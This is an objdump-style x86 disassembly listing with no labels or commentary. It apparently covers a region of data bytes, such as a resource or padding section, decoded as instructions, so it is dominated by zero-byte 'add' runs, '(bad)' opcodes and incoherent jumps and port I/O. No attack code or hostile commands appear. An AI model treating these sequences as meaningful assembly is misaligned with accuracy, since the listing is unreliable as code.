  41043f:	add    BYTE PTR [eax+0xc000],al
  410445:	add    BYTE PTR [eax],al
  410447:	add    BYTE PTR [eax],al
  410449:	add    al,al
  41044b:	add    BYTE PTR [eax],al
  41044d:	add    BYTE PTR [eax],al
  41044f:	add    BYTE PTR [eax],al
  410451:	add    al,al
  410453:	add    BYTE PTR [eax],al
  410455:	add    BYTE PTR [eax],al
  410457:	add    BYTE PTR [eax],al
  410459:	add    al,al
  41045b:	add    BYTE PTR [eax],al
  41045d:	add    BYTE PTR [eax],al
  41045f:	add    BYTE PTR [eax],al
  410461:	add    al,al
  410463:	add    BYTE PTR [eax],al
  410465:	add    BYTE PTR [eax],al
  410467:	add    BYTE PTR [eax],al
  410469:	add    al,al
  41046b:	add    BYTE PTR [eax],al
  41046d:	add    BYTE PTR [eax],al
  41046f:	add    BYTE PTR [eax],al
  410471:	add    al,al
  410473:	add    BYTE PTR [eax],al
  410475:	add    BYTE PTR [eax],al
  410477:	add    BYTE PTR [eax],al
  410479:	add    al,al
  41047b:	add    BYTE PTR [eax],al
  41047d:	add    BYTE PTR [eax],al
  41047f:	add    BYTE PTR [eax],al
  410481:	add    al,al
  410483:	add    BYTE PTR [eax],al
  410485:	add    BYTE PTR [eax],al
  410487:	add    BYTE PTR [eax+0xc001],al
  41048d:	add    BYTE PTR [eax],al
  41048f:	add    al,al
  410491:	add    eax,eax
  410493:	add    BYTE PTR [eax],al
  410495:	add    BYTE PTR [eax],al
  410497:	add    al,ah
  410499:	add    eax,eax
  41049b:	add    BYTE PTR [eax],al
  41049d:	add    BYTE PTR [eax],al
  41049f:	add    al,dh
  4104a1:	xadd   BYTE PTR [eax],al
  4104a4:	add    BYTE PTR [eax],al
  4104a6:	add    BYTE PTR [eax],al
  4104a8:	sub    BYTE PTR [eax],al
  4104aa:	add    BYTE PTR [eax],al
  4104ac:	and    BYTE PTR [eax],al
  4104ae:	add    BYTE PTR [eax],al
  4104b0:	inc    eax
  4104b1:	add    BYTE PTR [eax],al
  4104b3:	add    BYTE PTR [ecx],al
  4104b5:	add    BYTE PTR [eax],ah
  4104b7:	add    BYTE PTR [eax],al
  4104b9:	add    BYTE PTR [eax],al
  4104bb:	add    BYTE PTR [eax+0x10],al
	...
  4105ad:	add    BYTE PTR [eax],al
  4105af:	add    BYTE PTR [edi+edx*2+0x57844f24],al
  4105b6:	and    al,0xff
  4105b8:	test   BYTE PTR [edi+0x24],dl
  4105bb:	inc    DWORD PTR [edi+edx*2+0x4f24]
	...
  4105d6:	add    BYTE PTR [eax],al
  4105d8:	xchg   edx,eax
  4105d9:	pusha  
  4105da:	and    eax,0x1d578a0b
  4105df:	pop    esp
  4105e0:	mov    ebx,DWORD PTR [esi+eiz*1-0x52]
  4105e4:	cdq    
  4105e5:	je     0x410630
  4105e7:	loopne 0x410585
  4105e9:	jnp    0x41063f
  4105eb:	lock mov fs,WORD PTR [esi+0x38]
  4105ef:	into   
  4105f0:	adc    BYTE PTR [edx+0x1d],0x93
  4105f4:	adc    DWORD PTR [ebp+0x22],0x32
	...
  41062c:	test   BYTE PTR [edi+0x24],dl
  41062f:	sub    eax,DWORD PTR [edi+edx*2-0x2f0800dc]
  410636:	mov    ecx,0xb9d0f7ff
  41063b:	inc    DWORD PTR [edi+edx*2+0xff24]
	...
  410652:	add    BYTE PTR [eax],al
  410654:	xchg   esi,eax
  410655:	bound  esp,QWORD PTR [esp+ebx*1]
  410658:	mov    WORD PTR [edi+0x17],ss
  41065b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41065c:	mov    ds:0xd7fe4a7a,al
  410661:	retf   0xffb9
  410664:	lock out dx,eax
  410666:	in     al,dx
  410667:	push   esp
  410669:	idiv   eax
  41066b:	jmp    esi
  41066d:	(bad)  
  41066f:	inc    esp
  410671:	scas   al,BYTE PTR es:[edi]
  410672:	xchg   esi,eax
  410673:	inc    DWORD PTR [ebp-0x7f17d9a8]
  410679:	push   edx
  41067a:	push   ds
  41067b:	imul   eax,DWORD PTR [eax],0x0
	...
  4106a9:	add    BYTE PTR [eax],al
  4106ab:	add    BYTE PTR [edi+edx*2+0x57844f24],al
  4106b2:	and    al,0xff
  4106b4:	not    eax
  4106b6:	mov    ecx,0xb9d0f7ff
  4106bb:	inc    DWORD PTR [edi+edx*2+0xff24]
	...
  4106ce:	add    BYTE PTR [eax],al
  4106d0:	call   0x175a:0x92092565
  4106d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106d8:	stos   DWORD PTR es:[edi],eax
  4106d9:	test   BYTE PTR [edi-0x1],dl
  4106dc:	out    dx,al
  4106dd:	out    dx,eax
  4106de:	in     eax,dx
  4106df:	(bad)  
  4106e0:	cld    
  4106e1:	std    
  4106e2:	(bad)  
  4106e3:	(bad)  
  4106e4:	cld    
  4106e5:	std    
  4106e6:	(bad)  
  4106e7:	(bad)  
  4106e8:	std    
  4106e9:	std    
  4106ea:	(bad)  
  4106eb:	(bad)  
  4106ec:	(bad)  
  4106ed:	(bad)  
  4106ee:	(bad)  
  4106ef:	(bad)  
  4106f0:	(bad)  
  4106f1:	(bad)  
  4106f2:	(bad)  
  4106f3:	jmp    ecx
  4106f5:	xlat   BYTE PTR ds:[ebx]
  4106f6:	retf   
  4106f7:	inc    DWORD PTR [esi-0x7e0bd7a6]
  4106fd:	push   edx
  4106fe:	push   ds
  4106ff:	push   edi
	...
  410710:	test   BYTE PTR [edi+0x24],dl
  410713:	sub    eax,DWORD PTR [eax]
	...
  410725:	add    BYTE PTR [eax],al
  410727:	add    BYTE PTR [edi+edx*2+0x57842b24],al
  41072e:	and    al,0xff
  410730:	not    eax
  410732:	mov    ecx,0xb9d0f7ff
  410737:	inc    DWORD PTR [edi+edx*2+0x5784ff24]
  41073e:	and    al,0x4f
	...
  410750:	cdq    
  410751:	popa   
  410752:	push   ds
  410753:	pop    ebx
  410754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410755:	jl     0x41079f
  410757:	sti    
  410758:	out    0xe8,eax
  41075a:	out    0xff,al
  41075c:	hlt    
  41075d:	idiv   dl
  41075f:	push   edi
  410761:	stc    
  410762:	cld    
  410763:	(bad)  
  410764:	stc    
  410765:	cli    
  410766:	cld    
  410767:	(bad)  
  410768:	sti    
  410769:	cld    
  41076a:	std    
  41076b:	(bad)  
  41076c:	std    
  41076d:	std    
  41076e:	(bad)  
  41076f:	(bad)  
  410770:	(bad)  
  410771:	(bad)  
  410772:	(bad)  
  410773:	(bad)  
  410774:	(bad)  
  410775:	(bad)  
  410776:	(bad)  
  410777:	(bad)  
  410778:	fmul   st(7),st
  41077a:	sar    edi,0x84
  41077d:	push   edi
  41077e:	and    edx,ebx
  410780:	adc    DWORD PTR [ebx+0x1e],0x3c
  410787:	add    BYTE PTR [eax],al
  410789:	add    BYTE PTR [eax],al
  41078b:	add    BYTE PTR [edi+edx*2+0x57842b24],al
  410792:	and    al,0xff
  410794:	test   BYTE PTR [edi+0x24],dl
  410797:	dec    edi
	...
  4107a8:	test   BYTE PTR [edi+0x24],dl
  4107ab:	dec    edi
  4107ac:	test   BYTE PTR [edi+0x24],dl
  4107af:	push   edi
  4107b1:	sar    BYTE PTR [ecx-0x462f0801],1
  4107b7:	inc    DWORD PTR [edi+edx*2+0x5784ff24]
  4107be:	and    al,0x2b
	...
  4107d0:	popf   
  4107d1:	and    ax,0xceb1
  4107d5:	mov    edi,0xf2edffab
  4107da:	idiv   edi
  4107dc:	repnz idiv dl
  4107df:	push   esp
  4107e1:	clc    
  4107e2:	sti    
  4107e3:	push   esi
  4107e5:	stc    
  4107e6:	sti    
  4107e7:	(bad)  
  4107e8:	stc    
  4107e9:	cli    
  4107ea:	cld    
  4107eb:	(bad)  
  4107ec:	cli    
  4107ed:	cld    
  4107ee:	(bad)  
  4107ef:	(bad)  
  4107f0:	cld    
  4107f1:	std    
  4107f2:	(bad)  
  4107f3:	(bad)  
  4107f4:	(bad)  
  4107f5:	(bad)  
  4107f6:	(bad)  
  4107f7:	(bad)  
  4107f8:	(bad)  
  4107f9:	(bad)  
  4107fa:	(bad)  
  4107fb:	jmp    FWORD PTR [ecx-0x7e009675]
  410801:	push   edx
  410802:	sbb    eax,0x8f
  410807:	add    BYTE PTR [eax],al
  410809:	add    BYTE PTR [eax],al
  41080b:	add    BYTE PTR [edi+edx*2+0x5a852b24],al
  410812:	sub    bh,bh
  410814:	test   BYTE PTR [edi+0x24],dl
  410817:	inc    DWORD PTR [edi+edx*2+0x4f24]
  41081e:	add    BYTE PTR [eax],al
  410820:	add    BYTE PTR [eax],al
  410822:	add    BYTE PTR [eax],al
  410824:	test   BYTE PTR [edi+0x24],dl
  410827:	sub    eax,DWORD PTR [edi+edx*2-0x2f0800dc]
  41082e:	mov    ecx,0xb9d0f7ff
  410833:	inc    DWORD PTR [edi+edx*2+0x5784ff24]
  41083a:	and    al,0x4f
	...
  410850:	test   al,0x79
  410852:	aas    
  410853:	loope  0x410830
  410855:	fcom   st(1)
  410857:	(bad)  
  410858:	out    dx,al
  410859:	icebp  
  41085a:	idiv   edi
  41085c:	out    dx,eax
  41085d:	hlt    
  41085e:	cli    
  41085f:	push   edx
  410861:	idiv   dl
  410863:	push   ebx
  410865:	idiv   edx
  410867:	push   esi
  410869:	stc    
  41086a:	sti    
  41086b:	(bad)  
  41086c:	clc    
  41086d:	cli    
  41086e:	cld    
  41086f:	(bad)  
  410870:	sti    
  410871:	cld    
  410872:	std    
  410873:	(bad)  
  410874:	cld    
  410875:	std    
  410876:	(bad)  
  410877:	(bad)  
  410878:	std    
  410879:	(bad)  
  41087a:	(bad)  
  41087b:	inc    edi
  41087d:	mov    eax,0x618bffa6
  410882:	das    
  410883:	ret    0x0
  410886:	add    BYTE PTR [eax],al
  410888:	add    BYTE PTR [eax],al
  41088a:	add    BYTE PTR [eax],al
  41088c:	test   BYTE PTR [edi+0x24],dl
  41088f:	sub    ecx,DWORD PTR [eax-0x600d3a3]
  410895:	fcmovne st,st(2)
  410897:	inc    DWORD PTR [edi+edx*2+0x5784ff24]
  41089e:	and    al,0x4f
  4108a0:	add    BYTE PTR [eax],al
  4108a2:	add    BYTE PTR [eax],al
  4108a4:	test   BYTE PTR [edi+0x24],dl
  4108a7:	dec    edi
  4108a8:	test   BYTE PTR [edi+0x24],dl
  4108ab:	push   edi
  4108ad:	sar    BYTE PTR [ecx-0x462f0801],1
  4108b3:	inc    DWORD PTR [edi+edx*2+0x5784ff24]
  4108ba:	and    al,0x2b
	...
  4108d0:	mov    al,0x86
  4108d2:	push   ebx
  4108d3:	lock jecxz 0x4108bd
  4108d6:	call   0xf932f5da
  4108db:	(bad)  
  4108dc:	out    dx,al
  4108dd:	repnz clc 
  4108df:	(bad)  
  4108e0:	out    dx,eax
  4108e1:	hlt    
  4108e2:	stc    
  4108e3:	push   ecx
  4108e5:	idiv   dl
  4108e7:	push   esp
  4108e9:	idiv   edx
  4108eb:	push   ebp
  4108ed:	clc    
  4108ee:	sti    
  4108ef:	(bad)  
  4108f0:	clc    
  4108f1:	cli    
  4108f2:	std    
  4108f3:	(bad)  
  4108f4:	cli    
  4108f5:	cld    
  4108f6:	std    
  4108f7:	(bad)  
  4108f8:	cld    
  4108f9:	cld    
  4108fa:	(bad)  
  4108fb:	call   edi
  4108fd:	rol    edi,1
  4108ff:	call   DWORD PTR [ecx+0xd23b69]
  410905:	add    BYTE PTR [eax],al
  410907:	add    BYTE PTR [eax],al
  410909:	add    BYTE PTR [eax],al
  41090b:	add    BYTE PTR [edi+edx*2+0x608a2b24],al
  410912:	xor    bh,bh
  410914:	cli    
  410915:	loopne 0x4108e6
  410917:	(bad)  
  410918:	stc    
  410919:	fmul   st(2),st
  41091b:	inc    DWORD PTR [edi+edx*2+0x5784ff24]
  410922:	and    al,0x4f
  410924:	test   BYTE PTR [edi+0x24],dl
  410927:	push   edi
  410929:	sar    DWORD PTR [ebx-0x462f0801],1
  41092f:	inc    DWORD PTR [edi+edx*2+0x5784ff24]
  410936:	and    al,0x4f
	...
  410950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410951:	je     0x410989
  410953:	into   
  410954:	fcom   st(2)
  410956:	(bad)  
  410959:	out    dx,eax
  41095a:	idiv   edi
  41095c:	jmp    0x41094f
  41095e:	clc    
  41095f:	(bad)  
  410960:	in     eax,dx
  410961:	repnz clc 
  410963:	(bad)  
  410964:	out    dx,eax
  410965:	hlt    
  410966:	stc    
  410967:	push   ecx
  410969:	cmc    
  41096a:	cli    
  41096b:	push   ebx
  41096d:	idiv   edx
  41096f:	push   ebp
  410971:	clc    
  410972:	cld    
  410973:	push   edi
  410975:	cli    
  410976:	cld    
  410977:	(bad)  
  410978:	sti    
  410979:	cld    
  41097a:	std    
  41097b:	(bad)  
  41097c:	mov    esp,0x8aff8ba6
  410981:	pop    esp
  410982:	daa    
  410983:	scas   eax,DWORD PTR es:[edi]
	...
  41098c:	test   BYTE PTR [edi+0x24],dl
  41098f:	sub    ecx,DWORD PTR [ebp-0x500c79b]
  410995:	jecxz  0x41096c
  410997:	(bad)  
  410998:	cli    
  410999:	(bad)  
  41099b:	(bad)  
  41099c:	stc    
  41099d:	(bad)  
  41099f:	inc    DWORD PTR [edi+edx*2-0x290700dc]
  4109a6:	ret    0xf7ff
  4109a9:	aam    0xbf
  4109ab:	push   edi
  4109ad:	sar    BYTE PTR [ebx+0x245784ff],cl
  4109b3:	inc    DWORD PTR [edi+edx*2+0x57842b24]
  4109ba:	and    al,0x2b
  4109bc:	test   BYTE PTR [edi+0x24],dl
  4109bf:	sub    eax,DWORD PTR [edi+edx*2+0x57842b24]
  4109c6:	and    al,0x2b
	...
  4109d0:	mov    eax,ds:0xc5961f66
  4109d5:	lods   al,BYTE PTR ds:[esi]
  4109d6:	mov    edi,?
  4109d8:	jmp    0xeb40fecc
  4109dd:	lock idiv edi
  4109e0:	jmp    0x4109d3
  4109e2:	clc    
  4109e3:	(bad)  
  4109e4:	in     al,dx
  4109e5:	repnz clc 
  4109e7:	(bad)  
  4109e8:	out    dx,eax
  4109e9:	repz stc 
  4109eb:	push   ecx
  4109ed:	cmc    
  4109ee:	cli    
  4109ef:	push   ebx
  4109f1:	idiv   dl
  4109f3:	push   ebp
  4109f5:	clc    
  4109f6:	cld    
  4109f7:	push   esp
  4109f9:	cmc    
  4109fa:	cmc    
  4109fb:	jmp    DWORD PTR [eax-0x7704b386]
  410a01:	push   ebp
  410a02:	sbb    esi,DWORD PTR [ebx+0x0]
  410a05:	add    BYTE PTR [eax],al
  410a07:	add    BYTE PTR [eax],al
  410a09:	add    BYTE PTR [eax],al
  410a0b:	add    BYTE PTR [edi+edx*2+0x6a902b24],al
  410a12:	ds (bad) 
  410a14:	sti    
  410a15:	call   0xe53d09f6
  410a1a:	(bad)  
  410a1b:	(bad)  
  410a1c:	cli    
  410a1d:	loopne 0x4109f0
  410a1f:	(bad)  
  410a20:	stc    
  410a21:	(bad)  
  410a23:	(bad)  
  410a24:	stc    
  410a25:	fld    st(7)
  410a27:	(bad)  
  410a28:	clc    
  410a29:	(bad)  
  410a2a:	ret    
  410a2b:	(bad)  
  410a2c:	clc    
  410a2d:	aam    0xbf
  410a2f:	push   edi
  410a31:	sar    BYTE PTR [ebx+0x245784ff],cl
  410a37:	inc    DWORD PTR [edi+edx*2+0x5784ff24]
  410a3e:	and    al,0xff
  410a40:	test   BYTE PTR [edi+0x24],dl
  410a43:	inc    DWORD PTR [edi+edx*2+0x5784ff24]
  410a4a:	and    al,0x4f
  410a4c:	add    BYTE PTR [eax],al
  410a4e:	add    BYTE PTR [eax],al
  410a50:	mov    eax,ds:0xa2322268
  410a55:	imul   esp,DWORD PTR ds:0xbdccd5e7,0xf7f0eaff
  410a5f:	(bad)  
  410a60:	jmp    0xf7f1:0xebfff7f0
  410a67:	(bad)  
  410a68:	in     eax,dx
  410a69:	repnz idiv edi
  410a6c:	out    dx,eax
  410a6d:	repz clc 
  410a6f:	push   eax
  410a71:	hlt    
  410a72:	stc    
  410a73:	push   edx
  410a75:	idiv   dl
  410a77:	inc    eax
  410a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a7a:	xchg   edi,edi
  410a7c:	mov    dl,BYTE PTR [ebp+0x18]
  410a7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a80:	lea    ebx,[edx+eiz*1+0x1a]
	...
  410a8c:	test   BYTE PTR [edi+0x24],dl
  410a8f:	sub    edx,DWORD PTR [edi+ebp*2-0x140300bb]
  410a96:	loop   0x410a97
  410a98:	sti    
  410a99:	call   0xe53d0a7a
  410a9e:	xlat   BYTE PTR ds:[ebx]
  410a9f:	(bad)  
  410aa0:	cli    
  410aa1:	loope  0x410a74
  410aa3:	(bad)  
  410aa4:	stc    
  410aa5:	(bad)  
  410aa7:	(bad)  
  410aa8:	stc    
  410aa9:	fxch   st(0)
  410aab:	(bad)  
  410aac:	clc    
  410aad:	xlat   BYTE PTR ds:[ebx]
  410aae:	ret    
  410aaf:	push   edi
  410ab1:	aam    0xc0
  410ab3:	push   edi
  410ab5:	sar    BYTE PTR [edi+edi*8-0x462f09],cl
  410abc:	not    eax
  410abe:	mov    ecx,0x245784ff
  410ac3:	inc    DWORD PTR [edi+edx*2+0x4f24]
  410aca:	add    BYTE PTR [eax],al
  410acc:	add    BYTE PTR [eax],al
  410ace:	add    BYTE PTR [eax],al
  410ad0:	mov    ds:0xa0012469,al
  410ad5:	gs push ds
  410ad7:	push   0xffffffa3
  410ad9:	imul   ebp,DWORD PTR [eax],0xfffffff3
  410adc:	rol    ch,cl
  410ade:	mov    ah,0xff
  410ae0:	call   0xeb40fed3
  410ae5:	out    dx,eax
  410ae6:	idiv   bh
  410ae8:	jmp    0x410adb
  410aea:	idiv   edi
  410aec:	jmp    0x410ade
  410aee:	idiv   edi
  410af0:	call   0xc040f8e0
  410af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410af6:	test   bh,bh
  410af8:	(bad)  
  410af9:	pop    eax
  410afa:	push   ss
  410afb:	int3   
  410afc:	xchg   ecx,eax
  410afd:	pop    edi
  410afe:	and    al,0x28
	...
  410b0c:	test   BYTE PTR [edi+0x24],dl
  410b0f:	sub    edx,DWORD PTR [esi-0x300b38c]
  410b15:	lock call 0xe42e081a
  410b1b:	(bad)  
  410b1c:	sti    
  410b1d:	call   0xe63c0aff
  410b22:	fdivr  st,st(7)
  410b24:	cli    
  410b25:	loope  0x410af9
  410b27:	(bad)  
  410b28:	cli    
  410b29:	fmulp  st(5),st
  410b2b:	(bad)  
  410b2c:	stc    
  410b2d:	fcmove st,st(0)
  410b2f:	(bad)  
  410b30:	clc    
  410b31:	xlat   BYTE PTR ds:[ebx]
  410b32:	(bad)  
  410b33:	(bad)  
  410b34:	clc    
  410b35:	aad    0xc0
  410b37:	push   edi
  410b39:	sar    BYTE PTR [edi+edi*8-0xdba87c],cl
  410b40:	test   BYTE PTR [edi+0x24],dl
  410b43:	dec    edi
	...
  410b54:	mov    ds:0xa0012569,al
  410b59:	popw   ds
  410b5b:	pop    eax
  410b5c:	mov    ds:0xb4d22469,al
  410b61:	mov    WORD PTR [ecx-0x2],ds
  410b64:	retf   0x9cb7
  410b67:	call   esp
  410b69:	retf   
  410b6a:	mov    esp,0x789ebbff
  410b6f:	jmp    DWORD PTR [edi-0x6a09bc86]
  410b75:	pop    ebp
  410b76:	sbb    ah,BYTE PTR [edi+0x29246296]
	...
  410b8c:	test   BYTE PTR [edi+0x24],dl
  410b8f:	sub    ebx,DWORD PTR [ecx-0x200ac87]
  410b95:	repz out dx,al
  410b97:	(bad)  
  410b98:	cld    
  410b99:	lock call 0xe52e089e
  410b9f:	(bad)  
  410ba0:	cld    
  410ba1:	jmp    0xe73c0b84
  410ba6:	fcos   
  410ba8:	cli    
  410ba9:	loop   0x410b7e
  410bab:	(bad)  
  410bac:	cli    
  410bad:	fmulp  st(6),st
  410baf:	(bad)  
  410bb0:	stc    
  410bb1:	fcmovne st,st(1)
  410bb3:	(bad)  
  410bb4:	clc    
  410bb5:	fadd   st,st(5)
  410bb7:	inc    DWORD PTR [edi+edx*2+0x5784ff24]
  410bbe:	and    al,0x4f
	...
  410bd8:	mov    ds:0xa001256a,al
  410bdd:	gs pop ds
  410bdf:	cmp    eax,0x8e1c649f
  410be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410be5:	jno    0x410c17
  410be7:	ret    0x76a8
  410bea:	cmp    dl,bl
  410bec:	lahf   
  410bed:	addr16 and al,0xaf
  410bf0:	cdq    
  410bf1:	pop    esi
  410bf2:	sbb    dh,BYTE PTR [edx-0x66]
  410bf5:	and    ebx,DWORD PTR fs:[ebx]
	...
  410c0c:	test   BYTE PTR [edi+0x24],dl
  410c0f:	sub    ebx,DWORD PTR [eax-0x200af89]
  410c15:	div    bl
  410c17:	(bad)  
  410c18:	std    
  410c19:	hlt    
  410c1a:	out    dx,al
  410c1b:	(bad)  
  410c1c:	std    
  410c1d:	lock jmp 0xe52f0922
  410c23:	(bad)  
  410c24:	sti    
  410c25:	jmp    0xffd9:0xe5fbffdf
  410c2c:	cli    
  410c2d:	loop   0x410c03
  410c2f:	(bad)  
  410c30:	cli    
  410c31:	(bad)  
  410c33:	inc    DWORD PTR [edi+edx*2+0x5784ff24]
  410c3a:	and    al,0x4f
	...
  410c8c:	test   BYTE PTR [edi+0x24],dl
  410c8f:	sub    ebx,DWORD PTR [edx-0x100ab86]
  410c95:	cli    
  410c96:	clc    
  410c97:	(bad)  
  410c98:	(bad)  
  410c99:	clc    
  410c9a:	repz (bad) 
  410c9c:	std    
  410c9d:	hlt    
  410c9e:	out    dx,eax
  410c9f:	(bad)  
  410ca0:	cld    
  410ca1:	icebp  
  410ca2:	jmp    0xfbff:0xe5eefcff
  410ca9:	jmp    0xffda:0xe7faffdf
  410cb0:	xchg   DWORD PTR [esp+ebp*1-0x1],ebx
  410cb4:	test   BYTE PTR [edi+0x24],dl
  410cb7:	dec    edi
	...
  410d0c:	test   BYTE PTR [edi+0x24],dl
  410d0f:	sub    ebx,DWORD PTR [ebp+edi*2-0x30100a8]
  410d16:	cld    
  410d17:	(bad)  
  410d18:	(bad)  
  410d19:	sti    
  410d1a:	stc    
  410d1b:	(bad)  
  410d1c:	(bad)  
  410d1d:	clc    
  410d1e:	hlt    
  410d1f:	(bad)  
  410d20:	(bad)  
  410d21:	cmc    
  410d22:	out    dx,eax
  410d23:	(bad)  
  410d24:	std    
  410d25:	icebp  
  410d26:	jmp    0x410d27
  410d28:	cld    
  410d29:	out    dx,al
  410d2a:	out    0xff,al
  410d2c:	lea    esp,[ebp+0x38]
  410d2f:	inc    DWORD PTR [edi+edx*2+0x4f24]
	...
  410d8a:	add    BYTE PTR [eax],al
  410d8c:	test   BYTE PTR [edi+0x24],dl
  410d8f:	sub    ebx,DWORD PTR [esi-0xa481]
  410d95:	(bad)  
  410d96:	(bad)  
  410d97:	(bad)  
  410d98:	(bad)  
  410d99:	std    
  410d9a:	cld    
  410d9b:	(bad)  
  410d9c:	(bad)  
  410d9d:	sti    
  410d9e:	clc    
  410d9f:	(bad)  
  410da0:	(bad)  
  410da1:	clc    
  410da2:	hlt    
  410da3:	(bad)  
  410da4:	(bad)  
  410da5:	cmc    
  410da6:	lock call DWORD PTR [edi+ebp*2+0x5784ff45]
  410dae:	and    al,0x4f
	...
  410dd8:	xchg   edx,eax
  410dd9:	pusha  
  410dda:	and    eax,0x1d578a0b
  410ddf:	pop    esp
  410de0:	mov    ebx,DWORD PTR [esi+eiz*1-0x52]
  410de4:	cdq    
  410de5:	je     0x410e30
  410de7:	loopne 0x410d85
  410de9:	jnp    0x410e3f
  410deb:	lock mov fs,WORD PTR [esi+0x38]
  410def:	into   
  410df0:	adc    BYTE PTR [edx+0x1d],0x93
  410df4:	adc    DWORD PTR [ebp+0x22],0x32
	...
  410e0c:	test   BYTE PTR [edi+0x24],dl
  410e0f:	sub    ebx,DWORD PTR [edx-0xad88]
  410e15:	(bad)  
  410e16:	(bad)  
  410e17:	(bad)  
  410e18:	(bad)  
  410e19:	(bad)  
  410e1a:	(bad)  
  410e1b:	(bad)  
  410e1c:	(bad)  
  410e1d:	std    
  410e1e:	cld    
  410e1f:	(bad)  
  410e20:	(bad)  
  410e21:	cld    
  410e22:	stc    
  410e23:	call   FWORD PTR [edx-0x5600ac87]
  410e29:	xchg   DWORD PTR [ebx-0x1],esp
  410e2c:	mov    ecx,0xb9ff7f9d
  410e31:	popf   
  410e32:	jg     0x410e33
  410e34:	mov    ecx,0xb9ff7f9d
  410e39:	popf   
  410e3a:	jg     0x410e3b
  410e3c:	mov    ecx,0xb9ff7f9d
  410e41:	popf   
  410e42:	jg     0x410e43
  410e44:	mov    ecx,0xb9ff7f9d
  410e49:	popf   
  410e4a:	jg     0x410e4b
	...
  410e54:	xchg   esi,eax
  410e55:	bound  esp,QWORD PTR [esp+ebx*1]
  410e58:	mov    WORD PTR [edi+0x17],ss
  410e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e5c:	mov    ds:0xd7fe4a7a,al
  410e61:	retf   0xffb9
  410e64:	lock out dx,eax
  410e66:	in     al,dx
  410e67:	push   esp
  410e69:	idiv   eax
  410e6b:	jmp    esi
  410e6d:	(bad)  
  410e6f:	inc    esp
  410e71:	scas   al,BYTE PTR es:[edi]
  410e72:	xchg   esi,eax
  410e73:	inc    DWORD PTR [ebp-0x7f17d9a8]
  410e79:	push   edx
  410e7a:	push   ds
  410e7b:	imul   eax,DWORD PTR [eax],0x0
	...
  410e89:	add    BYTE PTR [eax],al
  410e8b:	add    BYTE PTR [edi+edx*2+0x789a2b24],al
  410e92:	push   edx
  410e93:	(bad)  
  410e94:	(bad)  
  410e95:	(bad)  
  410e96:	(bad)  
  410e97:	(bad)  
  410e98:	(bad)  
  410e99:	(bad)  
  410e9a:	(bad)  
  410e9b:	(bad)  
  410e9c:	(bad)  
  410e9d:	(bad)  
  410e9e:	(bad)  
  410e9f:	call   FWORD PTR [edi-0x2600a17f]
  410ea5:	retf   
  410ea6:	mov    ebx,0xffffffff
  410eab:	(bad)  
  410eac:	(bad)  
  410ead:	(bad)  
  410eae:	(bad)  
  410eaf:	(bad)  
  410eb0:	(bad)  
  410eb1:	(bad)  
  410eb2:	(bad)  
  410eb3:	(bad)  
  410eb4:	(bad)  
  410eb5:	(bad)  
  410eb6:	(bad)  
  410eb7:	(bad)  
  410eb8:	(bad)  
  410eb9:	(bad)  
  410eba:	(bad)  
  410ebb:	(bad)  
  410ebc:	(bad)  
  410ebd:	(bad)  
  410ebe:	(bad)  
  410ebf:	(bad)  
  410ec0:	(bad)  
  410ec1:	(bad)  
  410ec2:	(bad)  
  410ec3:	(bad)  
  410ec4:	(bad)  
  410ec5:	(bad)  
  410ec6:	(bad)  
  410ec7:	(bad)  
  410ec8:	mov    ecx,0xff7f9d
  410ecd:	add    BYTE PTR [eax],al
  410ecf:	add    BYTE PTR [edx-0x6df6da9b],bl
  410ed5:	pop    edx
  410ed6:	pop    ss
  410ed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ed8:	stos   DWORD PTR es:[edi],eax
  410ed9:	test   BYTE PTR [edi-0x1],dl
  410edc:	in     eax,dx
  410edd:	in     eax,dx
  410ede:	jmp    0x410edf
  410ee0:	(bad)  
  410ee1:	(bad)  
  410ee2:	(bad)  
  410ee3:	(bad)  
  410ee4:	(bad)  
  410ee5:	(bad)  
  410ee6:	(bad)  
  410ee7:	(bad)  
  410ee8:	(bad)  
  410ee9:	(bad)  
  410eea:	(bad)  
  410eeb:	(bad)  
  410eec:	(bad)  
  410eed:	(bad)  
  410eee:	(bad)  
  410eef:	(bad)  
  410ef0:	(bad)  
  410ef1:	(bad)  
  410ef2:	(bad)  
  410ef3:	(bad)  
  410ef4:	fst    st(1)
  410ef6:	ret    
  410ef7:	inc    DWORD PTR [esi-0x7e0bd7a6]
  410efd:	push   edx
  410efe:	push   ds
  410eff:	push   edi
	...
  410f0c:	test   BYTE PTR [edi+0x24],dl
  410f0f:	sub    ebx,DWORD PTR [esi-0xa481]
  410f15:	(bad)  
  410f16:	(bad)  
  410f17:	(bad)  
  410f18:	(bad)  
  410f19:	(bad)  
  410f1a:	(bad)  
  410f1b:	jmp    DWORD PTR [ebx-0x26009979]
  410f21:	retf   
  410f22:	mov    ebx,0xefeff1ff
  410f27:	push   ecx
  410f29:	out    dx,eax
  410f2a:	out    dx,eax
  410f2b:	push   ecx
  410f2d:	out    dx,eax
  410f2e:	out    dx,eax
  410f2f:	push   ecx
  410f31:	out    dx,eax
  410f32:	out    dx,eax
  410f33:	push   ecx
  410f35:	out    dx,eax
  410f36:	out    dx,eax
  410f37:	push   ecx
  410f39:	out    dx,eax
  410f3a:	out    dx,eax
  410f3b:	push   ecx
  410f3d:	out    dx,eax
  410f3e:	out    dx,eax
  410f3f:	push   ecx
  410f41:	out    dx,eax
  410f42:	out    dx,eax
  410f43:	push   ecx
  410f45:	out    dx,eax
  410f46:	out    dx,eax
  410f47:	(bad)  
  410f48:	mov    ecx,0xff7f9d
  410f4d:	add    BYTE PTR [eax],al
  410f4f:	add    BYTE PTR [ecx-0x58a4e19f],bl
  410f55:	jl     0x410f9f
  410f57:	sti    
  410f58:	in     eax,0xe6
  410f5a:	jecxz  0x410f5b
  410f5c:	repnz hlt 
  410f5e:	clc    
  410f5f:	jmp    edx
  410f61:	out    dx,al
  410f62:	jecxz  0x410f63
  410f64:	lods   al,BYTE PTR ds:[esi]
  410f65:	fldcw  WORD PTR [esi-0x6b326d01]
  410f6b:	inc    esp
  410f6d:	jecxz  0x410f34
  410f6f:	(bad)  
